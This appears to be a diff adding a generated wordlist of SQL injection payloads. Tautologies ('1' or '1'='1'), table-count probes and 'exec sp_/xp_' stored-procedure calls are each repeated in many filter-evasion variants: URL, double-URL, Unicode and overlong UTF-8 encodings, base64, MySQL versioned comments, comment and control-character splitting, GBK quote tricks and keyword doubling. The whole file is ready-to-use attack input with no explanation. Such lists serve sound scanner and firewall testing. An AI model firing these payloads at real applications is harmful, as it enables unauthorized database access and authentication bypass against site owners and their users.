@@ -1,0 +1,425 @@
+1%EF%BC%871
+
+1%00%271
+
+1'1
+%00
+MScxCg==
+1'1
+
+1'1
+
+%2531%2527%2531%250A
+%31%27%31%0A
+%u0031%u0027%u0031%u000A
+1'1
+
+1'1
+
+1'1
+
+1'1
+
+1'1
+
+1'1
+
+1'1
+
+1'1
+
+1'1
+
+1'1
+
+1%C0%AF1%C0%8A
+%1%'%1%
+
+1'1
+
+1'1
+
+1'1
+ and '0having'='0having'
+1'1
+-- sp_password
+1'1/**/
+1'1--hrZEITtYNJ%0A
+1'1%23AgSzSkmRn%0A
+1'1%23hkhJBoVtHq%0A
+1'1%05
+1'1%23%0A
+1'1%0A
+1'1--%0A
+1'1+
+1'1%09
+1'1
+
+1%bf%271
+
+1'1
+
+1'1
+
+1'1
+
+1'1
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+%00
+MSBleGVjIHNwXyAob3IgZXhlYyB4cF8pCg==
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+%2531%2520%2565%2578%2565%2563%2520%2573%2570%255F%2520%2528%256F%2572%2520%2565%2578%2565%2563%2520%2578%2570%255F%2529%250A
+%31%20%65%78%65%63%20%73%70%5F%20%28%6F%72%20%65%78%65%63%20%78%70%5F%29%0A
+%u0031%u0020%u0065%u0078%u0065%u0063%u0020%u0073%u0070%u005F%u0020%u0028%u006F%u0072%u0020%u0065%u0078%u0065%u0063%u0020%u0078%u0070%u005F%u0029%u000A
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 /*!30145exec sp_ (or exec xp_)
+*/
+1 /*!00000exec sp_ (or exec xp_)
+*/
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1%C0%AAexec%C0%AAsp%C0%DF%C0%AA%C0%AAor%C0%AAexec%C0%AAxp%C0%DF%C0%AB%C0%8A
+%1 %e%x%e%c %s%p%_ %(%o%r %e%x%e%c %x%p%_%)%
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+ and '0having'='0having'
+1 exec sp_ (or exec xp_)
+-- sp_password
+1/**/exec/**/sp_/**/(or/**/exec/**/xp_)
+
+1--IfHDGKyDqOr%0Aexec--YcVWiUbkFG%0Asp_--bFkBZHo%0A(or--RramvBudEgY%0Aexec--jWWkFC%0Axp_)--JVcVDYJE%0A
+1%23qHJZkLmyn%0Aexec%23lTTrvHYnSkO%0Asp_%23FiylNY%0A(or%23yFwclGsgU%0Aexec%23qLzbNWjm%0Axp_)%23qhRaLh%0A
+1%23eJAnwLXHME%0Aexec%23XoOQPVSr%0Asp_%23NBbZQABzApt%0A(or%23yDwJfzUEaia%0Aexec%23SFNHZPPVpk%0Axp_)%23lOelJE%0A
+1%08exec%0Asp_%07(or%08exec%03xp_)
+
+1%23%0Aexec%23%0Asp_%23%0A(or%23%0Aexec%23%0Axp_)%23%0A
+1%0Aexec%0Bsp_%0B(or%0Aexec%0Axp_)
+
+1--%0Aexec--%0Asp_--%0A(or--%0Aexec--%0Axp_)--%0A
+1+exec+sp_+(or+exec+xp_)
+
+1%0Aexec%09sp_%09(or%0Aexec%0Dxp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 exec sp_ (or exec xp_)
+
+1 and 1=1
+
+1 and 1=1
+
+1 and 1=1
+%00
+MSBhbmQgMT0xCg==
+1 and 1 BETWEEN 1 AND 1
+1 and 1 LIKE 1
+
+%2531%2520%2561%256E%2564%2520%2531%253D%2531%250A
+%31%20%61%6E%64%20%31%3D%31%0A
+%u0031%u0020%u0061%u006E%u0064%u0020%u0031%u003D%u0031%u000A
+1 and 1=1
+
+1 and 1 LIKE 1
+
+1 and 1=1
+
+1 and 1=1
+
+1 and 1=1
+
+1 and 1=1
+
+1 /*!30182and 1=1
+*/
+1 /*!00000and 1=1
+*/
+1 and 1=1
+
+1 and 1=1
+
+1%C0%AAand%C0%AA1%C0%BF1%C0%8A
+%1 %a%n%d %1%=%1%
+
+1 and 1=1
+
+1 and 1=1
+
+1 and 1=1
+ and '0having'='0having'
+1 and 1=1
+-- sp_password
+1/**/and/**/1=1
+
+1--xUBZFAgHM%0Aand--sNwKDaWwpGm%0A1=1--DHQwKXkAcb%0A
+1%23BlTfDXKasmAI%0Aand%23InqBFo%0A1=1%23uatnHr%0A
+1%23wQxDpmNfRSL%0Aand%23grNKtDHRJJ%0A1=1%23zFRFFwlZRSO%0A
+1%0Cand%061=1
+
+1%23%0Aand%23%0A1=1%23%0A
+1%0Cand%0D1=1
+
+1--%0Aand--%0A1=1--%0A
+1+and+1=1
+
+1%0Aand%0C1=1
+
+1 and 1=1
+
+1 and 1=1
+
+1 and 1=1
+
+1 and 1=1
+
+1 and 1=1
+
+1 and 1=1
+
+1%EF%BC%87 and 1=(select count(*) from tablenames); --
+
+1%00%27 and 1=(select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+%00
+MScgYW5kIDE9KHNlbGVjdCBjb3VudCgqKSBmcm9tIHRhYmxlbmFtZXMpOyAtLQo=
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1 LIKE (select count(*) from tablenames); --
+
+%2531%2527%2520%2561%256E%2564%2520%2531%253D%2528%2573%2565%256C%2565%2563%2574%2520%2563%256F%2575%256E%2574%2528%252A%2529%2520%2566%2572%256F%256D%2520%2574%2561%2562%256C%2565%256E%2561%256D%2565%2573%2529%253B%2520%252D%252D%250A
+%31%27%20%61%6E%64%20%31%3D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%20%66%72%6F%6D%20%74%61%62%6C%65%6E%61%6D%65%73%29%3B%20%2D%2D%0A
+%u0031%u0027%u0020%u0061%u006E%u0064%u0020%u0031%u003D%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u006F%u0075%u006E%u0074%u0028%u002A%u0029%u0020%u0066%u0072%u006F%u006D%u0020%u0074%u0061%u0062%u006C%u0065%u006E%u0061%u006D%u0065%u0073%u0029%u003B%u0020%u002D%u002D%u000A
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1 LIKE (select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+
+1' /*!30683and 1=(select count(*) from tablenames); */--
+
+1' /*!00000and 1=(select count(*) from tablenames); */--
+
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1=(SESELECTLECT count(*) FRFROMOM tablenames); --
+
+1%C0%AF%C0%AAand%C0%AA1%C0%BF%C0%AAselect%C0%AAcount%C0%AA%C0%AA%C0%AB%C0%AAfrom%C0%AAtablenames%C0%AB%C0%BB%C0%AA%C0%AF%C0%AF%C0%8A
+%1%' %a%n%d %1%=%(%s%e%l%e%c%t %c%o%u%n%t%(%*%) %f%r%o%m %t%a%b%l%e%n%a%m%e%s%)%; %-%-%
+
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+ and '0having'='0having'
+1' and 1=(select count(*) from tablenames); --
+-- sp_password
+1'/**/and/**/1=(select/**/count(*)/**/from/**/tablenames);/**/--
+
+1'--UxBzAak%0Aand--ZJiOfd%0A1=(select--oRDJSv%0Acount(*)--fnLhgfqHSQz%0Afrom--lEbvxyLAP%0Atablenames);--yMivhl%0A----yTwyBDyltSd%0A
+1'%23mUrlkqYAs%0Aand%23vgatgo%0A1=(select%23VwQlksC%0Acount(*)%23GrqqiTVjs%0Afrom%23pVKLBnC%0Atablenames);%23GQtIJuHL%0A--%23xlAWRmwLOjQ%0A
+1'%23NMbIOycZyCL%0Aand%23WyfULYIJH%0A1=(select%23hytOkVAK%0Acount(*)%23QNPRNTrwWvA%0Afrom%23SZjvuXd%0Atablenames);%23tDRAFdjmBSI%0A--%23hoHNeNUeQy%0A
+1'%08and%011=(select%0Bcount(*)%05from%07tablenames);%04--
+
+1'%23%0Aand%23%0A1=(select%23%0Acount(*)%23%0Afrom%23%0Atablenames);%23%0A--%23%0A
+1'%0Aand%0B1=(select%0Bcount(*)%0Bfrom%0Atablenames);%0C--
+
+1'--%0Aand--%0A1=(select--%0Acount(*)--%0Afrom--%0Atablenames);--%0A----%0A
+1'+and+1=(select+count(*)+from+tablenames);+--
+
+1'%0Dand%091=(select%0Acount(*)%0Dfrom%0Ctablenames);%0C--
+
+1' and 1=(select count(*) from tablenames); --
+
+1%bf%27 and 1=(select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+
+1' and 1=(select count(*) from tablenames); --
+
+1 or 1=1
+
+1 or 1=1
+
+1 or 1=1
+%00
+MSBvciAxPTEK
+1 or 1 BETWEEN 1 AND 1
+1 or 1 LIKE 1
+
+%2531%2520%256F%2572%2520%2531%253D%2531%250A
+%31%20%6F%72%20%31%3D%31%0A
+%u0031%u0020%u006F%u0072%u0020%u0031%u003D%u0031%u000A
+1 or 1=1
+
+1 or 1 LIKE 1
+
+1 or 1=1
+
+1 or 1=1
+
+1 or 1=1
+
+1 or 1=1
+
+1 /*!30255or 1=1
+*/
+1 /*!00000or 1=1
+*/
+1 or 1=1
+
+1 or 1=1
+
+1%C0%AAor%C0%AA1%C0%BF1%C0%8A
+%1 %o%r %1%=%1%
+
+1 or 1=1
+
+1 or 1=1
+
+1 or 1=1
+ and '0having'='0having'
+1 or 1=1
+-- sp_password
+1/**/or/**/1=1
+
+1--bOapaXqyah%0Aor--HMMxCThWY%0A1=1--RpJIXY%0A
+1%23aOIZgMCG%0Aor%23nWcdranKXSq%0A1=1%23mjZiFJ%0A
+1%23cCRdNXtftf%0Aor%23xEuzYByToY%0A1=1%23slrnyuLYjch%0A
+1%0For%021=1
+
+1%23%0Aor%23%0A1=1%23%0A
+1%09or%0C1=1
+
+1--%0Aor--%0A1=1--%0A
+1+or+1=1
+
+1%0Aor%091=1
+
+1 or 1=1
+
+1 or 1=1
+
+1 or 1=1
+
+1 or 1=1
+
+1 or 1=1
+
+1 or 1=1
+
+1%EF%BC%87 or %EF%BC%871%EF%BC%87=%EF%BC%871
+
+1%00%27 or %00%271%00%27=%00%271
+
+1' or '1'='1
+%00
+MScgb3IgJzEnPScxCg==
+1' or '1'='1
+
+1' or '1' LIKE '1
+
+%2531%2527%2520%256F%2572%2520%2527%2531%2527%253D%2527%2531%250A
+%31%27%20%6F%72%20%27%31%27%3D%27%31%0A
+%u0031%u0027%u0020%u006F%u0072%u0020%u0027%u0031%u0027%u003D%u0027%u0031%u000A
+1' or '1'='1
+
+1' or '1' LIKE '1
+
+1' or '1'='1
+
+1' or '1'='1
+
+1' or '1'='1
+
+1' or '1'='1
+
+1' /*!30230or '1'='1
+*/
+1' /*!00000or '1'='1
+*/
+1' or '1'='1
+
+1' or '1'='1
+
+1%C0%AF%C0%AAor%C0%AA%C0%AF1%C0%AF%C0%BF%C0%AF1%C0%8A
+%1%' %o%r %'%1%'%=%'%1%
+
+1' or '1'='1
+
+1' or '1'='1
+
+1' or '1'='1
+ and '0having'='0having'
+1' or '1'='1
+-- sp_password
+1'/**/or/**/'1'='1
+
+1'--WQskMw%0Aor--pOlsVdqM%0A'1'='1--VgUnYXSvPqb%0A
+1'%23kxcJZh%0Aor%23IaDYpE%0A'1'='1%23mQzITwZrdiZI%0A
+1'%23BhdYKC%0Aor%23vZYNTlchz%0A'1'='1%23eZZSyevyBF%0A
+1'%08or%03'1'='1
+
+1'%23%0Aor%23%0A'1'='1%23%0A
+1'%0Aor%0A'1'='1
+
+1'--%0Aor--%0A'1'='1--%0A
+1'+or+'1'='1
+
+1'%0Dor%09'1'='1
+
+1' or '1'='1
+
+1%bf%27
+-- 
+1' or '1'='1
+
+1' or '1'='1
+
+1' or '1'='1
+
+1' or '1'='1
+
